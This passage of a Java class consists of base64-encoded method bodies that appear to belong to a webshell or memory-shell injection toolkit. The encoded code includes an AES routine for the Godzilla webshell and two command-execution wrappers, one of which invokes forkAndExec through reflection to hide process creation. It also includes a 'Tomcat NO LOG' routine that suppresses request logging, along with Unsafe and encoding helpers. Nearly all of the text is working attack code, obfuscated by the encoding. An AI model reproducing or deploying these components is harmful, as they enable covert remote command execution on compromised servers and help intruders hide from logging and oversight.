	public static String GET_UNSAFE = "cHVibGljIHN0YXRpYyBzdW4ubWlzYy5VbnNhZmUgZ2V0VW5zYWZlKCkgew0KCQlzdW4ubWlzYy5VbnNhZmUgdW5zYWZlID0gbnVsbDsNCgkJdHJ5IHsNCgkJCWlmIChDbGFzcy5mb3JOYW1lKG5ldyBUaHJvd2FibGUoKS5nZXRTdGFja1RyYWNlKClbMV0uZ2V0Q2xhc3NOYW1lKCkpLmdldENsYXNzTG9hZGVyKCkgPT0gbnVsbCkgew0KCQkJCXVuc2FmZSA9IHN1bi5taXNjLlVuc2FmZS5nZXRVbnNhZmUoKTsNCgkJCX0NCgkJfSBjYXRjaCAoQ2xhc3NOb3RGb3VuZEV4Y2VwdGlvbiBpZ25vcmVkKSB7DQoJCX0NCg0KCQlpZiAodW5zYWZlID09IG51bGwpIHsNCgkJCXRyeSB7DQoJCQkJQ2xhc3MgICAgICAgICAgICAgICAgICAgZ3NvbkNsYXNzID0gQ2xhc3MuZm9yTmFtZSgiY29tLmdvb2dsZS5nc29uLmludGVybmFsLnJlZmxlY3QuVW5zYWZlUmVmbGVjdGlvbkFjY2Vzc29yIik7DQoJCQkJamF2YS5sYW5nLnJlZmxlY3QuRmllbGQgZmllbGQgICAgID0gZ3NvbkNsYXNzLmdldERlY2xhcmVkRmllbGQoInRoZVVuc2FmZSIpOw0KCQkJCWZpZWxkLnNldEFjY2Vzc2libGUodHJ1ZSk7DQoJCQkJdW5zYWZlID0gKHN1bi5taXNjLlVuc2FmZSkgZmllbGQuZ2V0KG51bGwpOw0KCQkJfSBjYXRjaCAoRXhjZXB0aW9uIGlnbm9yZWQpIHsNCgkJCX0NCgkJfQ0KDQoJCWlmICh1bnNhZmUgPT0gbnVsbCkgew0KCQkJdHJ5IHsNCgkJCQlDbGFzcyAgICAgICAgICAgICAgICAgICBuZXR0eUNsYXNzID0gQ2xhc3MuZm9yTmFtZSgiaW8ubmV0dHkudXRpbC5pbnRlcm5hbC5zaGFkZWQub3JnLmpjdG9vbHMudXRpbC5VbnNhZmVBY2Nlc3MiKTsNCgkJCQlqYXZhLmxhbmcucmVmbGVjdC5GaWVsZCBmaWVsZCAgICAgID0gbmV0dHlDbGFzcy5nZXREZWNsYXJlZEZpZWxkKCJVTlNBRkUiKTsNCgkJCQlmaWVsZC5zZXRBY2Nlc3NpYmxlKHRydWUpOw0KCQkJCXVuc2FmZSA9IChzdW4ubWlzYy5VbnNhZmUpIGZpZWxkLmdldChudWxsKTsNCgkJCX0gY2F0Y2ggKEV4Y2VwdGlvbiBpZ25vcmVkKSB7DQoJCQl9DQoJCX0NCg0KCQlpZiAodW5zYWZlID09IG51bGwpIHsNCgkJCXRyeSB7DQoJCQkJamF2YS5sYW5nLnJlZmxlY3QuRmllbGQgdGhlVW5zYWZlRmllbGQgPSBzdW4ubWlzYy5VbnNhZmUuY2xhc3MuZ2V0RGVjbGFyZWRGaWVsZCgidGhlVW5zYWZlIik7DQoJCQkJdGhlVW5zYWZlRmllbGQuc2V0QWNjZXNzaWJsZSh0cnVlKTsNCgkJCQl1bnNhZmUgPSAoc3VuLm1pc2MuVW5zYWZlKSB0aGVVbnNhZmVGaWVsZC5nZXQobnVsbCk7DQoJCQl9IGNhdGNoIChFeGNlcHRpb24gaWdub3JlZCkgew0KCQkJfQ0KCQl9DQoNCgkJcmV0dXJuIHVuc2FmZTsNCgl9";

	// base64Decode
	public static String BASE64_DECODE_STRING_TO_BYTE = "cHVibGljIHN0YXRpYyBieXRlW10gYmFzZTY0RGVjb2RlKFN0cmluZyBicykgdGhyb3dzIEV4Y2VwdGlvbiB7CgkJQ2xhc3MgIGJhc2U2NDsKCQlieXRlW10gdmFsdWUgPSBudWxsOwoJCXRyeSB7CgkJCWJhc2U2NCA9IENsYXNzLmZvck5hbWUoImphdmEudXRpbC5CYXNlNjQiKTsKCQkJT2JqZWN0IGRlY29kZXIgPSBiYXNlNjQuZ2V0TWV0aG9kKCJnZXREZWNvZGVyIiwgbnVsbCkuaW52b2tlKGJhc2U2NCwgbnVsbCk7CgkJCXZhbHVlID0gKGJ5dGVbXSkgZGVjb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZGVjb2RlIiwgbmV3IENsYXNzW117U3RyaW5nLmNsYXNzfSkuaW52b2tlKGRlY29kZXIsIG5ldyBPYmplY3RbXXtic30pOwoJCX0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7CgkJCXRyeSB7CgkJCQliYXNlNjQgPSBDbGFzcy5mb3JOYW1lKCJzdW4ubWlzYy5CQVNFNjREZWNvZGVyIik7CgkJCQlPYmplY3QgZGVjb2RlciA9IGJhc2U2NC5uZXdJbnN0YW5jZSgpOwoJCQkJdmFsdWUgPSAoYnl0ZVtdKSBkZWNvZGVyLmdldENsYXNzKCkuZ2V0TWV0aG9kKCJkZWNvZGVCdWZmZXIiLCBuZXcgQ2xhc3NbXXtTdHJpbmcuY2xhc3N9KS5pbnZva2UoZGVjb2RlciwgbmV3IE9iamVjdFtde2JzfSk7CgkJCX0gY2F0Y2ggKEV4Y2VwdGlvbiBlMikgewoJCQl9CgkJfQoJCXJldHVybiB2YWx1ZTsKCX0";

	// base64Encode
	public static String BASE64_ENCODE_BYTE_TO_STRING = "cHVibGljIHN0YXRpYyBTdHJpbmcgYmFzZTY0RW5jb2RlKGJ5dGVbXSBicykgdGhyb3dzIEV4Y2VwdGlvbiB7CgkJQ2xhc3MgIGJhc2U2NDsKCQlTdHJpbmcgdmFsdWUgPSBudWxsOwoJCXRyeSB7CgkJCWJhc2U2NCA9IENsYXNzLmZvck5hbWUoImphdmEudXRpbC5CYXNlNjQiKTsKCQkJT2JqZWN0IEVuY29kZXIgPSBiYXNlNjQuZ2V0TWV0aG9kKCJnZXRFbmNvZGVyIiwgbnVsbCkuaW52b2tlKGJhc2U2NCwgbnVsbCk7CgkJCXZhbHVlID0gKFN0cmluZykgRW5jb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZW5jb2RlVG9TdHJpbmciLCBuZXcgQ2xhc3NbXXtieXRlW10uY2xhc3N9KS5pbnZva2UoRW5jb2RlciwgbmV3IE9iamVjdFtde2JzfSk7CgkJfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHsKCQkJdHJ5IHsKCQkJCWJhc2U2NCA9IENsYXNzLmZvck5hbWUoInN1bi5taXNjLkJBU0U2NEVuY29kZXIiKTsKCQkJCU9iamVjdCBFbmNvZGVyID0gYmFzZTY0Lm5ld0luc3RhbmNlKCk7CgkJCQl2YWx1ZSA9IChTdHJpbmcpIEVuY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImVuY29kZSIsIG5ldyBDbGFzc1tde2J5dGVbXS5jbGFzc30pLmludm9rZShFbmNvZGVyLCBuZXcgT2JqZWN0W117YnN9KTsKCQkJfSBjYXRjaCAoRXhjZXB0aW9uIGlnbm9yZWQpIHsKCQkJfQoJCX0KCQlyZXR1cm4gdmFsdWU7Cgl9";

	// MD5
	public static String MD5 = "CXB1YmxpYyBzdGF0aWMgU3RyaW5nIG1kNShTdHJpbmcgcykgewoJCVN0cmluZyByZXQgPSBudWxsOwoJCXRyeSB7CgkJCWphdmEuc2VjdXJpdHkuTWVzc2FnZURpZ2VzdCBtOwoJCQltID0gamF2YS5zZWN1cml0eS5NZXNzYWdlRGlnZXN0LmdldEluc3RhbmNlKCJNRDUiKTsKCQkJbS51cGRhdGUocy5nZXRCeXRlcygpLCAwLCBzLmxlbmd0aCgpKTsKCQkJcmV0ID0gbmV3IGphdmEubWF0aC5CaWdJbnRlZ2VyKDEsIG0uZGlnZXN0KCkpLnRvU3RyaW5nKDE2KS50b1VwcGVyQ2FzZSgpOwoJCX0gY2F0Y2ggKEV4Y2VwdGlvbiBpZ25vcmVkKSB7CgkJfQoJCXJldHVybiByZXQ7Cgl9";

	// 哥斯拉 AES 方法 x（需要 Field xc）
	public static String AES_FOR_GODZILLA = "CXB1YmxpYyBieXRlW10geChieXRlW10gcywgYm9vbGVhbiBtKSB7CgkJdHJ5IHsKCQkJamF2YXguY3J5cHRvLkNpcGhlciBjID0gamF2YXguY3J5cHRvLkNpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7CgkJCWMuaW5pdChtID8gMSA6IDIsIG5ldyBqYXZheC5jcnlwdG8uc3BlYy5TZWNyZXRLZXlTcGVjKHhjLmdldEJ5dGVzKCksICJBRVMiKSk7CgkJCXJldHVybiBjLmRvRmluYWwocyk7CgkJfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHsKCQkJcmV0dXJuIG51bGw7CgkJfQoJfQ==";

	// 命令执行封装方法，使用反射调用 forkandexec, 需要 toCString getMethodByClass getMethodAndInvoke getFieldValue getUnsafe
	public static String EXEC_CMD_OBSCURE = "cHVibGljIHN0YXRpYyBqYXZhLmlvLkJ5dGVBcnJheU91dHB1dFN0cmVhbSBleGVjQ21kKFN0cmluZyBjbWQpIHsKCQl0cnkgewoJCQlpZiAoY21kICE9IG51bGwgJiYgIWNtZC5pc0VtcHR5KCkpIHsKCQkJCVN0cmluZ1tdICAgICAgICAgICAgICAgICAgICAgIGNtZHMgICAgICAgICAgPSBudWxsOwoJCQkJQ2xhc3MgICAgICAgICAgICAgICAgICAgICAgICAgcHJvY2Vzc0NsYXNzICA9IG51bGw7CgkJCQlPYmplY3QgICAgICAgICAgICAgICAgICAgICAgICBwcm9jZXNzT2JqZWN0ID0gbnVsbDsKCQkJCXN1bi5taXNjLlVuc2FmZSAgICAgICAgICAgICAgIHVuc2FmZSAgICAgICAgPSBnZXRVbnNhZmUoKTsKCQkJCWphdmEuaW8uQnl0ZUFycmF5T3V0cHV0U3RyZWFtIGJhb3MgICAgICAgICAgPSBuZXcgamF2YS5pby5CeXRlQXJyYXlPdXRwdXRTdHJlYW0oKTsKCQkJCWlmIChTeXN0ZW0uZ2V0UHJvcGVydHkoIm9zLm5hbWUiKS50b0xvd2VyQ2FzZSgpLmNvbnRhaW5zKCJ3aW4iKSkgewoJCQkJCWNtZHMgPSBuZXcgU3RyaW5nW117ImNtZCIsICIvYyIsIGNtZH07CgkJCQkJcHJvY2Vzc0NsYXNzID0gQ2xhc3MuZm9yTmFtZSgiamF2YS5sYW5nLlByb2Nlc3NJbXBsIik7CgkJCQkJcHJvY2Vzc09iamVjdCA9IHVuc2FmZS5hbGxvY2F0ZUluc3RhbmNlKHByb2Nlc3NDbGFzcyk7CgkJCQkJbG9uZ1tdICAgICAgICBzdGRIYW5kbGVzID0gbmV3IGxvbmdbXXstMUwsIC0xTCwgLTFMfTsKCQkJCQlTdHJpbmdCdWlsZGVyIHNiICAgICAgICAgPSBuZXcgU3RyaW5nQnVpbGRlcigpOwoJCQkJCWZvciAoaW50IGkgPSAwOyBpIDwgY21kcy5sZW5ndGg7IGkrKykgewoJCQkJCQlzYi5hcHBlbmQoY21kc1tpXSkuYXBwZW5kKCIgIik7CgkJCQkJfQoJCQkJCU9iamVjdCAgICAgICAgICAgICAgICAgICAgaGFuZGxlID0gIGdldE1ldGhvZEFuZEludm9rZShwcm9jZXNzT2JqZWN0LCAiY3JlYXRlIiwgbmV3IENsYXNzW117U3RyaW5nLmNsYXNzLCBTdHJpbmcuY2xhc3MsIFN0cmluZy5jbGFzcywgbG9uZ1tdLmNsYXNzLCBib29sZWFuLmNsYXNzfSwgbmV3IE9iamVjdFtde3NiLnRvU3RyaW5nKCkudHJpbSgpLCBudWxsLCBudWxsLCBzdGRIYW5kbGVzLCBqYXZhLmxhbmcuQm9vbGVhbi5GQUxTRX0pOwoJCQkJCWphdmEubGFuZy5yZWZsZWN0LkZpZWxkIGZpZWxkICA9IHByb2Nlc3NDbGFzcy5nZXREZWNsYXJlZEZpZWxkKCJoYW5kbGUiKTsKCQkJCQlmaWVsZC5zZXRBY2Nlc3NpYmxlKHRydWUpOwoJCQkJCWZpZWxkLnNldChwcm9jZXNzT2JqZWN0LCBoYW5kbGUpOwoJCQkJCWphdmEuaW8uRmlsZURlc2NyaXB0b3Igc3Rkb3V0X2ZkID0gbmV3IGphdmEuaW8uRmlsZURlc2NyaXB0b3IoKTsKCQkJCQlnZXRNZXRob2RBbmRJbnZva2UoZ2V0RmllbGRWYWx1ZShwcm9jZXNzT2JqZWN0LCAiZmRBY2Nlc3MiKSwgInNldEhhbmRsZSIsIG5ldyBDbGFzc1tde2phdmEuaW8uRmlsZURlc2NyaXB0b3IuY2xhc3MsIE9iamVjdC5jbGFzc30sIG5ldyBPYmplY3RbXXtzdGRvdXRfZmQsIExvbmcudmFsdWVPZihzdGRIYW5kbGVzWzFdKX0pOwoJCQkJCWphdmEubGFuZy5yZWZsZWN0LkZpZWxkIGZpZWxkMiA9IHByb2Nlc3NDbGFzcy5nZXREZWNsYXJlZEZpZWxkKCJzdGRvdXRfc3RyZWFtIik7CgkJCQkJZmllbGQyLnNldEFjY2Vzc2libGUodHJ1ZSk7CgkJCQkJZmllbGQyLnNldChwcm9jZXNzT2JqZWN0LCBuZXcgamF2YS5pby5CdWZmZXJlZElucHV0U3RyZWFtKG5ldyBqYXZhLmlvLkZpbGVJbnB1dFN0cmVhbShzdGRvdXRfZmQpKSk7CgkJCQl9IGVsc2UgewoJCQkJCWNtZHMgPSBuZXcgU3RyaW5nW117Ii9iaW4vYmFzaCIsICItYyIsIGNtZH07CgkJCQkJcHJvY2Vzc0NsYXNzID0gQ2xhc3MuZm9yTmFtZSgiamF2YS5sYW5nLlVOSVhQcm9jZXNzIik7CgkJCQkJcHJvY2Vzc09iamVjdCA9IHVuc2FmZS5hbGxvY2F0ZUluc3RhbmNlKHByb2Nlc3NDbGFzcyk7CgkJCQkJYnl0ZVtdW10gYXJncyA9IG5ldyBieXRlW2NtZHMubGVuZ3RoIC0gMV1bXTsKCQkJCQlpbnQgICAgICBzaXplID0gYXJncy5sZW5ndGg7CgkJCQkJZm9yIChpbnQgaSA9IDA7IGkgPCBhcmdzLmxlbmd0aDsgaSsrKSB7CgkJCQkJCWFyZ3NbaV0gPSBjbWRzW2kgKyAxXS5nZXRCeXRlcygpOwoJCQkJCQlzaXplICs9IGFyZ3NbaV0ubGVuZ3RoOwoJCQkJCX0KCQkJCQlieXRlW10gYXJnQmxvY2sgPSBuZXcgYnl0ZVtzaXplXTsKCQkJCQlpbnQgICAgaSAgICAgICAgPSAwOwoJCQkJCWZvciAoaW50IGkxID0gMDsgaTEgPCBhcmdzLmxlbmd0aDsgaTErKykgewoJCQkJCQlTeXN0ZW0uYXJyYXljb3B5KGFyZ3NbaTFdLCAwLCBhcmdCbG9jaywgaSwgYXJnc1tpMV0ubGVuZ3RoKTsKCQkJCQkJaSArPSBhcmdzW2kxXS5sZW5ndGggKyAxOwoJCQkJCX0KCQkJCQlpbnRbXSAgc3RkX2ZkcyAgICAgICAgICAgICAgID0gbmV3IGludFtdey0xLCAtMSwgLTF9OwoJCQkJCU9iamVjdCBsYXVuY2hNZWNoYW5pc21PYmplY3QgPSBnZXRGaWVsZFZhbHVlKHByb2Nlc3NPYmplY3QsICJsYXVuY2hNZWNoYW5pc20iKTsKCQkJCQlieXRlW10gaGVscGVycGF0aE9iamVjdCAgICAgID0gKGJ5dGVbXSkgZ2V0RmllbGRWYWx1ZShwcm9jZXNzT2JqZWN0LCAiaGVscGVycGF0aCIpOwoJCQkJCWludCAgICBvcmRpbmFsICAgICAgICAgICAgICAgPSBqYXZhLmxhbmcuSW50ZWdlci5wYXJzZUludChnZXRNZXRob2RBbmRJbnZva2UobGF1bmNoTWVjaGFuaXNtT2JqZWN0LCAib3JkaW5hbCIsIG51bGwsIG51bGwpLnRvU3RyaW5nKCkpOwoJCQkJCWdldE1ldGhvZEFuZEludm9rZShwcm9jZXNzT2JqZWN0LCAiZm9ya0FuZEV4ZWMiLCBuZXcgQ2xhc3NbXXtpbnQuY2xhc3MsIGJ5dGVbXS5jbGFzcywgYnl0ZVtdLmNsYXNzLCBieXRlW10uY2xhc3MsIGludC5jbGFzcywgYnl0ZVtdLmNsYXNzLCBpbnQuY2xhc3MsIGJ5dGVbXS5jbGFzcywgaW50W10uY2xhc3MsIGJvb2xlYW4uY2xhc3N9LCBuZXcgT2JqZWN0W117SW50ZWdlci52YWx1ZU9mKG9yZGluYWwgKyAxKSwgaGVscGVycGF0aE9iamVjdCwgdG9DU3RyaW5nKGNtZHNbMF0pLCBhcmdCbG9jaywgSW50ZWdlci52YWx1ZU9mKGFyZ3MubGVuZ3RoKSwgbnVsbCwgSW50ZWdlci52YWx1ZU9mKDEpLCBudWxsLCBzdGRfZmRzLCBqYXZhLmxhbmcuQm9vbGVhbi5GQUxTRX0pOwoJCQkJCWdldE1ldGhvZEFuZEludm9rZShwcm9jZXNzT2JqZWN0LCAiaW5pdFN0cmVhbXMiLCBuZXcgQ2xhc3NbXXtpbnRbXS5jbGFzc30sIG5ldyBPYmplY3RbXXtzdGRfZmRzfSk7CgkJCQl9CgkJCQlqYXZhLmlvLklucHV0U3RyZWFtIGluID0gKGphdmEuaW8uSW5wdXRTdHJlYW0pIGdldE1ldGhvZEFuZEludm9rZShwcm9jZXNzT2JqZWN0LCAiZ2V0SW5wdXRTdHJlYW0iLCBudWxsLCBudWxsKTsKCQkJCWludCAgICAgICAgICAgICAgICAgYSAgPSAwOwoJCQkJYnl0ZVtdICAgICAgICAgICAgICBiICA9IG5ldyBieXRlWzEwMjRdOwoJCQkJd2hpbGUgKChhID0gaW4ucmVhZChiKSkgIT0gLTEpIHsKCQkJCQliYW9zLndyaXRlKGIsIDAsIGEpOwoJCQkJfQoJCQkJcmV0dXJuIGJhb3M7CgkJCX0KCQl9IGNhdGNoIChFeGNlcHRpb24gaWdub3JlZCkgewoJCX0KCQlyZXR1cm4gbnVsbDsKCX0=";

	// 命令执行封装方法，简单使用 Runtime.getRuntime().exec()
	public static String EXEC_CMD = "cHVibGljIHN0YXRpYyBqYXZhLmlvLkJ5dGVBcnJheU91dHB1dFN0cmVhbSBleGVjQ21kKFN0cmluZyBjbWQpIHsKCQl0cnkgewoJCQlpZiAoY21kICE9IG51bGwgJiYgIWNtZC5pc0VtcHR5KCkpIHsKCQkJCVN0cmluZ1tdIGNtZHMgPSBudWxsOwoJCQkJaWYgKFN5c3RlbS5nZXRQcm9wZXJ0eSgib3MubmFtZSIpLnRvTG93ZXJDYXNlKCkuY29udGFpbnMoIndpbiIpKSB7CgkJCQkJY21kcyA9IG5ldyBTdHJpbmdbXXsiY21kIiwgIi9jIiwgY21kfTsKCQkJCX0gZWxzZSB7CgkJCQkJY21kcyA9IG5ldyBTdHJpbmdbXXsiL2Jpbi9iYXNoIiwgIi1jIiwgY21kfTsKCQkJCX0KCgkJCQlqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhjbWRzKS5nZXRJbnB1dFN0cmVhbSgpOwoJCQkJamF2YS5pby5CeXRlQXJyYXlPdXRwdXRTdHJlYW0gYmFvcyA9IG5ldyBqYXZhLmlvLkJ5dGVBcnJheU91dHB1dFN0cmVhbSgpOwoJCQkJaW50ICAgICAgICAgICAgICAgICAgICAgICAgICAgYSAgICA9IDA7CgkJCQlieXRlW10gICAgICAgICAgICAgICAgICAgICAgICBiICAgID0gbmV3IGJ5dGVbMTAyNF07CgoJCQkJd2hpbGUgKChhID0gaW4ucmVhZChiKSkgIT0gLTEpIHsKCQkJCQliYW9zLndyaXRlKGIsIDAsIGEpOwoJCQkJfQoKCQkJCXJldHVybiBiYW9zOwoJCQl9CgkJfSBjYXRjaCAoRXhjZXB0aW9uIGlnbm9yZWQpIHsKCQl9CgoJCXJldHVybiBudWxsOwoJfQ==";

	// Tomcat NO LOG 方法，需要 getFieldValue getMethodByClass getMethodAndInvoke
	public static String TOMCAT_NO_LOG = "cHVibGljIHZvaWQgbm9Mb2coT2JqZWN0IHJlcU9iaikgewoJCXRyeSB7CgkJCU9iamVjdCAgICAgICAgICAgICAgICAgICAgICBhcHBsaWNhdGlvbkNvbnRleHQgPSBnZXRGaWVsZFZhbHVlKGdldE1ldGhvZEFuZEludm9rZShyZXFPYmosICJnZXRTZXJ2bGV0Q29udGV4dCIsIG51bGwsIG51bGwpLCAiY29udGV4dCIpOwoJCQlPYmplY3QgICAgICAgICAgICAgICAgICAgICAgY29udGFpbmVyICAgICAgICAgID0gZ2V0RmllbGRWYWx1ZShhcHBsaWNhdGlvbkNvbnRleHQsICJjb250ZXh0Iik7CgkJCWphdmEudXRpbC5BcnJheUxpc3QgYXJyYXlMaXN0ICAgICAgICAgID0gbmV3IGphdmEudXRpbC5BcnJheUxpc3QoKTsKCQkJd2hpbGUgKGNvbnRhaW5lciAhPSBudWxsKSB7CgkJCQlhcnJheUxpc3QuYWRkKGNvbnRhaW5lcik7CgkJCQljb250YWluZXIgPSBnZXRNZXRob2RBbmRJbnZva2UoY29udGFpbmVyLCAiZ2V0UGFyZW50IiwgbnVsbCwgbnVsbCk7CgkJCX0KCQkJZm9yIChpbnQgaSA9IDA7IGkgPCBhcnJheUxpc3Quc2l6ZSgpOyBpKyspIHsKCQkJCXRyeSB7CgkJCQkJT2JqZWN0IHBpcGVsaW5lID0gZ2V0TWV0aG9kQW5kSW52b2tlKGFycmF5TGlzdC5nZXQoaSksICJnZXRQaXBlbGluZSIsIG51bGwsIG51bGwpOwoJCQkJCWlmIChwaXBlbGluZSAhPSBudWxsKSB7CgkJCQkJCU9iamVjdCB2YWx2ZSA9IGdldE1ldGhvZEFuZEludm9rZShwaXBlbGluZSwgImdldEZpcnN0IiwgbnVsbCwgbnVsbCk7CgkJCQkJCXdoaWxlICh2YWx2ZSAhPSBudWxsKSB7CgkJCQkJCQlpZiAoZ2V0TWV0aG9kQnlDbGFzcyh2YWx2ZS5nZXRDbGFzcygpLCAiZ2V0Q29uZGl0aW9uIiwgbnVsbCkgIT0gbnVsbCAmJiBnZXRNZXRob2RCeUNsYXNzKHZhbHZlLmdldENsYXNzKCksICJzZXRDb25kaXRpb24iLCBuZXcgQ2xhc3NbXXtTdHJpbmcuY2xhc3N9KSAhPSBudWxsKSB7CgkJCQkJCQkJU3RyaW5nIGNvbmRpdGlvbiA9IChTdHJpbmcpIGdldE1ldGhvZEFuZEludm9rZSh2YWx2ZSwgImdldENvbmRpdGlvbiIsIG51bGwsIG51bGwpOwoJCQkJCQkJCWNvbmRpdGlvbiA9IChjb25kaXRpb24gPT0gbnVsbCkgPyAiV2hhdGV2ZXIiIDogY29uZGl0aW9uOwoJCQkJCQkJCWdldE1ldGhvZEFuZEludm9rZSh2YWx2ZSwgInNldENvbmRpdGlvbiIsIG5ldyBDbGFzc1tde1N0cmluZy5jbGFzc30sIG5ldyBPYmplY3RbXXtjb25kaXRpb259KTsKCQkJCQkJCQlnZXRNZXRob2RBbmRJbnZva2UocmVxT2JqLCAic2V0QXR0cmlidXRlIiwgbmV3IENsYXNzW117U3RyaW5nLmNsYXNzLCBPYmplY3QuY2xhc3N9LCBuZXcgT2JqZWN0W117Y29uZGl0aW9uLCBjb25kaXRpb259KTsKCQkJCQkJCQl2YWx2ZSA9IGdldE1ldGhvZEFuZEludm9rZSh2YWx2ZSwgImdldE5leHQiLCBudWxsLCBudWxsKTsKCQkJCQkJCQljb250aW51ZTsKCQkJCQkJCX0KCQkJCQkJCWlmIChDbGFzcy5mb3JOYW1lKCJvcmcuYXBhY2hlLmNhdGFsaW5hLlZhbHZlIiwgZmFsc2UsIGFwcGxpY2F0aW9uQ29udGV4dC5nZXRDbGFzcygpLmdldENsYXNzTG9hZGVyKCkpLmlzQXNzaWduYWJsZUZyb20odmFsdmUuZ2V0Q2xhc3MoKSkpIHsKCQkJCQkJCQl2YWx2ZSA9IGdldE1ldGhvZEFuZEludm9rZSh2YWx2ZSwgImdldE5leHQiLCBudWxsLCBudWxsKTsKCQkJCQkJCQljb250aW51ZTsKCQkJCQkJCX0KCQkJCQkJCXZhbHZlID0gbnVsbDsKCQkJCQkJfQoJCQkJCX0KCQkJCX0gY2F0Y2ggKEV4Y2VwdGlvbiBpZ25vcmVkKSB7CgkJCQl9CgkJCX0KCQl9IGNhdGNoIChFeGNlcHRpb24gaWdub3JlZCkgewoJCX0KCX0=";

}
